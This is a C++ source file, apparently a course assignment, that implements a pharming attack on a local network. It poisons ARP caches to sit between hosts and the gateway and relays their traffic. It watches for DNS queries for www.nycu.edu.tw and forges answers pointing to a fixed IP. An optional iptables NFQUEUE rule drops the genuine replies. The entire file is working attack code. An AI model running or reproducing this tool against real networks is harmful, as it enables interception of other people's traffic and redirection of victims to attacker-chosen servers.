#include "pharm_attack.hpp"

// #define INFO 1
// #define NFQ 1
#define MAC_LENGTH 6

#ifdef NFQ
void handler(int signum) {
    system("sudo iptables -t mangle -D OUTPUT -j NFQUEUE --queue-num 0");
    exit(signum);
}
#endif

uint16_t computeChecksum(const std::vector<unsigned char> &buffer) {
    uint32_t sum = 0;
    for (size_t i = 0; i < buffer.size() - 1; i += 2) {
        sum += (buffer[i] << 8) + buffer[i + 1];
    }
    if (buffer.size() & 1) {
        sum += buffer[buffer.size() - 1] << 8;
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    return ~sum;
}

/*
Modify the source MAC address to the attacker to let the receiver think the packet is from the attacker
Change the destination MAC address of the packet to the corresponding MAC address in the map
*/
bool modifyPacket(uint8_t *buffer, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, struct LocalInfo local_info) {
    // Get the Ethernet header
    struct ethhdr *eth = (struct ethhdr *)buffer;

    // Get the IP header
    struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);

    bool modified = false;

    // Change the source MAC to my MAC
    memcpy(eth->h_source, local_info.src_mac.data(), ETH_ALEN);

    // If the destination IP is not in the map, change the destination MAC to the gateway's MAC
    if (ip_mac_pairs.find({(uint8_t)(iph->daddr & 0xff), (uint8_t)((iph->daddr >> 8) & 0xff), (uint8_t)((iph->daddr >> 16) & 0xff), (uint8_t)((iph->daddr >> 24) & 0xff)}) == ip_mac_pairs.end()) {
        // Find the MAC address for the gateway IP
        std::array<uint8_t, 4> gateway_ip_addr = {(uint8_t)(local_info.gateway_ip.sin_addr.s_addr & 0xff), (uint8_t)((local_info.gateway_ip.sin_addr.s_addr >> 8) & 0xff), (uint8_t)((local_info.gateway_ip.sin_addr.s_addr >> 16) & 0xff), (uint8_t)((local_info.gateway_ip.sin_addr.s_addr >> 24) & 0xff)};
        std::array<uint8_t, 6> &gateway_mac = ip_mac_pairs[gateway_ip_addr];
        memcpy(eth->h_dest, gateway_mac.data(), ETH_ALEN);
        modified = true;
    }
    // If the destination MAC is my_mac and the IP is not my IP, change the destination MAC to the IP's MAC
    if (memcmp(eth->h_dest, local_info.src_mac.data(), ETH_ALEN) != 0 && iph->daddr != local_info.src_ip.sin_addr.s_addr && !modified) {
        // Find the MAC address for the destination IP
        std::array<uint8_t, 4> dest_ip_addr;
        memcpy(dest_ip_addr.data(), &iph->daddr, 4);
        std::array<uint8_t, 6> &dest_mac = ip_mac_pairs[dest_ip_addr];
        memcpy(eth->h_dest, dest_mac.data(), ETH_ALEN);
        modified = true;
    }
    return modified;
}

void sendMarkedPacket(uint8_t *buffer, int bytes, int sd, struct LocalInfo local_info) {
    // Get the payload
    uint8_t *payload = buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr);
    int payload_length = bytes - (ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr));

    int chunk_size = 1024;  // Size of each chunk
    int total_sent = 0;     // Total amount of data sent
    while (total_sent < bytes) {
        int to_send = std::min(chunk_size, bytes - total_sent);
        if (sendto(sd, buffer + total_sent, to_send, 0, (struct sockaddr *)&local_info.device, sizeof(local_info.device)) <= 0) {
            perror("sendto() failed (Packet)");
            exit(EXIT_FAILURE);
        }
        total_sent += to_send;
    }
}

void send_dns_response(int payload_size, char *response_packet, uint32_t dst_ip, uint16_t dst_port, struct LocalInfo localinfo) {
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd == -1) {
        perror("send_dns_response socket error");
        return;
    }

    struct sockaddr_ll socket_address;
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ALL);
    socket_address.sll_ifindex = localinfo.device.sll_ifindex;
    socket_address.sll_hatype = htons(ARPHRD_ETHER);
    socket_address.sll_pkttype = PACKET_OTHERHOST;
    socket_address.sll_halen = MAC_LENGTH;
    socket_address.sll_addr[6] = 0x00;
    socket_address.sll_addr[7] = 0x00;

    ssize_t ret = sendto(fd, response_packet, payload_size, 0, (struct sockaddr *)&socket_address, sizeof(socket_address));
    if (ret == -1) {
        perror("send_dns_response sendto error");
        close(fd);
        return;
    }

    close(fd);
}

void makeSpoofedDNSResponse(uint8_t *buffer, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, struct LocalInfo local_info) {
    struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);
    struct udphdr *udph = (struct udphdr *)(buffer + ETH_HDRLEN + sizeof(struct iphdr));
    struct dnshdr *dnsh = (struct dnshdr *)(buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct udphdr));
    struct dns_query *dnsq = (struct dns_query *)(buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr));
    char *domain = (char *)(buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr));

    char response_packet[2048];
    memset(response_packet, 0, 2048);
    int payload_size = 0;
    std::string spoofed_site = "www.nycu.edu.tw";
    std::string target_ip = "140.113.24.241";

    // Make the response packet
    // DNS response header
    char *dns_response_hdr = (char *)(response_packet + ETH_HLEN + iph->ihl * 4 + sizeof(udphdr));
    memcpy(dns_response_hdr, dnsh->id, 2);
    memcpy(dns_response_hdr + 2, "\x81\x80", 2);   // Response, Recursion Desired, Recursion Available
    memcpy(dns_response_hdr + 4, "\x00\x01", 2);   // Question count
    memcpy(dns_response_hdr + 6, "\x00\x01", 2);   // Answer RR count
    memcpy(dns_response_hdr + 8, "\x00\x00", 2);   // Authority RR count
    memcpy(dns_response_hdr + 10, "\x00\x00", 2);  // Additional RR count
    payload_size += sizeof(dnshdr);

    // DNS response query
    char *dns_response_query = (char *)(response_packet + ETH_HLEN + iph->ihl * 4 + sizeof(udphdr) + sizeof(dnshdr));
    memcpy(dns_response_query, dnsq, spoofed_site.size() + 2);                // the original query
    memcpy(dns_response_query + spoofed_site.size() + 2, "\x00\x01", 2);      // type A
    memcpy(dns_response_query + spoofed_site.size() + 2 + 2, "\x00\x01", 2);  // class IN
    payload_size += spoofed_site.size() + 2 + 4;

    // DNS response answer
    char *dns_response_answer = (char *)(response_packet + ETH_HLEN + iph->ihl * 4 + sizeof(udphdr) + payload_size);
    memcpy(dns_response_answer, "\xc0\x0c", 2);              // pointer to the domain name
    memcpy(dns_response_answer + 2, "\x00\x01", 2);          // type A
    memcpy(dns_response_answer + 4, "\x00\x01", 2);          // class IN
    memcpy(dns_response_answer + 6, "\x00\x00\x00\x3c", 4);  // TTL
    memcpy(dns_response_answer + 10, "\x00\x04", 2);         // data length
    for (int i = 0; i < 4; i++) {
        std::string ip = target_ip.substr(0, target_ip.find("."));
        target_ip = target_ip.substr(target_ip.find(".") + 1);
        dns_response_answer[12 + i] = stoi(ip);
    }

    payload_size += 16;

    // ip, udp header
    struct iphdr *ip_response = (struct iphdr *)(response_packet + ETH_HLEN);
    ip_response->ihl = 5;
    ip_response->version = 4;
    ip_response->tos = 0;
    ip_response->tot_len = htons(20 + 8 + payload_size);
    ip_response->id = htons(0);
    ip_response->frag_off = 0;
    ip_response->ttl = 64;
    ip_response->protocol = IPPROTO_UDP;
    ip_response->check = 0;
    ip_response->saddr = iph->daddr;
    ip_response->daddr = iph->saddr;
    ip_response->check = htons(computeChecksum(std::vector<unsigned char>(response_packet + ETH_HLEN, response_packet + ETH_HLEN + ip_response->ihl * 4)));
    payload_size += 20;

    struct udphdr *udp_response = (struct udphdr *)(response_packet + ETH_HLEN + iph->ihl * 4);
    udp_response->source = htons(53);
    udp_response->dest = udph->source;
    udp_response->len = htons(8 + payload_size - 20);
    udp_response->check = 0;
    payload_size += 8;

    // ethernet header
    struct ether_header *eth_response = (struct ether_header *)response_packet;
    // destination mac: victim's mac
    memcpy(eth_response->ether_dhost, buffer + ETH_ALEN, ETH_ALEN);
    // source mac: my mac
    memcpy(eth_response->ether_shost, local_info.src_mac.data(), ETH_ALEN);
    eth_response->ether_type = htons(ETH_P_IP);
    payload_size += ETH_HLEN;

    // Send the packet
    send_dns_response(payload_size, response_packet, iph->saddr, ntohs(udph->source), local_info);
}

// Function to handle receiving responses
void receiveHandler(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, struct LocalInfo local_info) {
    uint8_t buffer[IP_MAXPACKET];
    struct sockaddr saddr;
    int saddr_len = sizeof(saddr);

    while (true) {
        // Receive packet
        int bytes = recvfrom(sd, buffer, IP_MAXPACKET, 0, &saddr, (socklen_t *)&saddr_len);
        if (bytes < 0) {
            perror("recvfrom() failed");
            exit(EXIT_FAILURE);
        }

        // Check if packet is an ARP packet
        if (buffer[12] == ETH_P_ARP / 256 && buffer[13] == ETH_P_ARP % 256) {
            parseARPReply(buffer, ip_mac_pairs, local_info);
            continue;
        }
        // Check if packet is an IP packet
        if (bytes < ETH_HDRLEN + sizeof(struct iphdr)) {
            continue;  // Not enough data for IP header
        }
        struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);  // Skip the Ethernet header
        if (iph->daddr == htonl(0x7f000001) || iph->saddr == htonl(0x7f000001)) {
            continue;
        }

        modifyPacket(buffer, ip_mac_pairs, local_info);

        // Skip non-UDP packets
        if (iph->protocol != IPPROTO_UDP) {
            sendMarkedPacket(buffer, bytes, sd, local_info);
            continue;
        }

        struct udphdr *udph = (struct udphdr *)(buffer + ETH_HDRLEN + iph->ihl * 4);

        // Check if the destination port is 53 (DNS Packet)
        if (ntohs(udph->dest) != 53) {
            sendMarkedPacket(buffer, bytes, sd, local_info);
            continue;
        }
        char response_packet[2048];
        memset(response_packet, 0, 2048);
        int payload_size = 0;
        std::string spoofed_site = "wwwnycuedutw";
        std::string target_ip = "140.113.24.241";
        struct dnshdr *dnsh = (struct dnshdr *)(ETH_HDRLEN + buffer + iph->ihl * 4 + sizeof(struct udphdr));
        struct dns_query *dnsq = (struct dns_query *)(ETH_HDRLEN + buffer + iph->ihl * 4 + sizeof(struct udphdr) + sizeof(struct dnshdr));
        char *domain = (char *)(ETH_HDRLEN + buffer + iph->ihl * 4 + sizeof(struct udphdr) + sizeof(struct dnshdr));
        printf("Domain: %s\n", domain);
        // Check if the domain is the spoofed site
        if (strcmp(domain, spoofed_site.c_str()) != 0) {
            sendMarkedPacket(buffer, bytes, sd, local_info);
            continue;
        }
        if (!(domain[spoofed_site.size() + 2] == 0x00 && domain[spoofed_site.size() + 3] == 0x01 && domain[spoofed_site.size() + 4] == 0x00 && domain[spoofed_site.size() + 5] == 0x01)) {
            sendMarkedPacket(buffer, bytes, sd, local_info);
            continue;
        }

        printf("Found the spoof target!!!\n");
        // Make the response packet
        makeSpoofedDNSResponse(buffer, ip_mac_pairs, local_info);

        memset(buffer, 0, IP_MAXPACKET);
    }
}

static int handleNFQPacket(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
                           struct nfq_data *nfa, void *data) {
    struct nfqnl_msg_packet_hdr *ph;
    struct nfqnl_msg_packet_hw *hwph;
    u_int32_t id = 0;
    ph = nfq_get_msg_packet_hdr(nfa);
    if (ph) {
        id = ntohl(ph->packet_id);
    }
    unsigned char *packet;
    int len = nfq_get_payload(nfa, &packet);
    if (len < 0) {
        printf("Error: nfq_get_payload returned %d\n", len);
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
    }
    // Parse the packet
    struct iphdr *iph = (struct iphdr *)packet;

    // Skip local
    if (iph->daddr == htonl(0x7f000001) || iph->saddr == htonl(0x7f000001)) {
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
    }

    // Skip non-UDP packets
    if (iph->protocol != IPPROTO_UDP) {
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
    }

    // Print source and destination IP addresses
    printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->saddr));
    printf("Destination IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->daddr));

    struct udphdr *udph = (struct udphdr *)(packet + iph->ihl * 4);

    // Check if the destination port is 53 (DNS Packet)
    if (ntohs(udph->dest) != 53) {
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
    }

    char response_packet[2048];
    memset(response_packet, 0, 2048);
    int payload_size = 0;
    std::string spoofed_site = "www.nycu.edu.tw";
    std::string target_ip = "140.113.24.241";
    struct dnshdr *dnsh = (struct dnshdr *)(packet + iph->ihl * 4 + sizeof(struct udphdr));
    struct dns_query *dnsq = (struct dns_query *)(packet + iph->ihl * 4 + sizeof(struct udphdr) + sizeof(struct dnshdr));
    char *domain = (char *)(packet + iph->ihl * 4 + sizeof(struct udphdr) + sizeof(struct dnshdr));
    printf("Domain: %s\n", domain);
    // Check if the domain is the spoofed site
    if (strcmp(domain, spoofed_site.c_str()) != 0) {
        printf("Not the spoofed site\n");
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
    }
    if (!(domain[spoofed_site.size() + 2] == 0x00 && domain[spoofed_site.size() + 3] == 0x01 && domain[spoofed_site.size() + 4] == 0x00 && domain[spoofed_site.size() + 5] == 0x01)) {
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
    }

    return nfq_set_verdict(qh, ph->packet_id, NF_DROP, 0, NULL);
}

void NFQHandler() {
    struct nfq_handle *h;
    struct nfq_q_handle *qh;
    struct nfnl_handle *nh;
    int fd;
    int rv;
    char buf[4096] __attribute__((aligned));

    h = nfq_open();
    if (!h) {
        fprintf(stderr, "error during nfq_open()\n");
        exit(1);
    }
    if (nfq_unbind_pf(h, AF_INET) < 0) {
        fprintf(stderr, "error during nfq_unbind_pf()\n");
        exit(1);
    }
    if (nfq_bind_pf(h, AF_INET) < 0) {
        fprintf(stderr, "error during nfq_bind_pf()\n");
        exit(1);
    }
    qh = nfq_create_queue(h, 0, &handleNFQPacket, NULL);
    if (!qh) {
        fprintf(stderr, "error during nfq_create_queue()\n");
        exit(1);
    }
    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
        fprintf(stderr, "can't set packet_copy mode\n");
        exit(1);
    }
    fd = nfq_fd(h);
    while ((rv = recv(fd, buf, sizeof(buf), 0)) && rv >= 0) {
        nfq_handle_packet(h, buf, rv);
    }
    nfq_destroy_queue(qh);
    nfq_close(h);
}

int main(int argc, char **argv) {
    char *interface;
    struct ifreq ifr;
    int sd;

    struct LocalInfo local_info;

    if (argc != 2) {
        printf("Usage: %s <interface>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Interface to send packet through.
    interface = argv[1];

    // Get source IP address.
    getSourceIP(interface, local_info.src_ip);

    // Get source MAC address.
    getMACAddress(interface, local_info.src_mac);

    // Get netmask.
    getMask(interface, local_info.netmask);

    // Get default gateway.
    getDefaultGateway(interface, local_info.gateway_ip);

    // Find interface index from interface name and store index in
    // struct sockaddr_ll device, which will be used as an argument of sendto().
    if ((local_info.device.sll_ifindex = if_nametoindex(interface)) == 0) {
        perror("if_nametoindex() failed to obtain interface index");
        exit(EXIT_FAILURE);
    }
#ifdef INFO
    printf("src_ip: %s\n", inet_ntoa(local_info.src_ip.sin_addr));
    printf("src_mac: %02x:%02x:%02x:%02x:%02x:%02x\n", local_info.src_mac[0], local_info.src_mac[1], local_info.src_mac[2], local_info.src_mac[3], local_info.src_mac[4], local_info.src_mac[5]);
    printf("netmask: %s\n", inet_ntoa(local_info.netmask.sin_addr));
    printf("Index for interface %s is %i\n", interface, local_info.device.sll_ifindex);
    printf("gateway_ip: %s\n", inet_ntoa(local_info.gateway_ip.sin_addr));
#endif

    // Submit request for a raw socket descriptor.
    if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        perror("socket() failed");
        exit(EXIT_FAILURE);
    }

    sendARPRequest(sd, local_info);

    // Use a table to save IP-MAC pairs
    std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> ip_mac_pairs;

    printf("Available devices\n");
    printf("-----------------------------------------\n");
    printf("IP\t\t\tMAC\n");
    printf("-----------------------------------------\n");

    // Start the threads
    std::thread send_thread(sendSpoofedARPReply, sd, std::ref(ip_mac_pairs), local_info);
    std::thread receive_thread(receiveHandler, sd, std::ref(ip_mac_pairs), local_info);

#ifdef NFQ
    system("sudo iptables -t mangle -A OUTPUT -j NFQUEUE --queue-num 0");
    signal(SIGINT, handler);

    // Start the NFQHandler
    NFQHandler();
#endif

    // Wait for threads to finish
    send_thread.join();
    receive_thread.join();

    // Close socket descriptor.
    close(sd);

    return (EXIT_SUCCESS);
}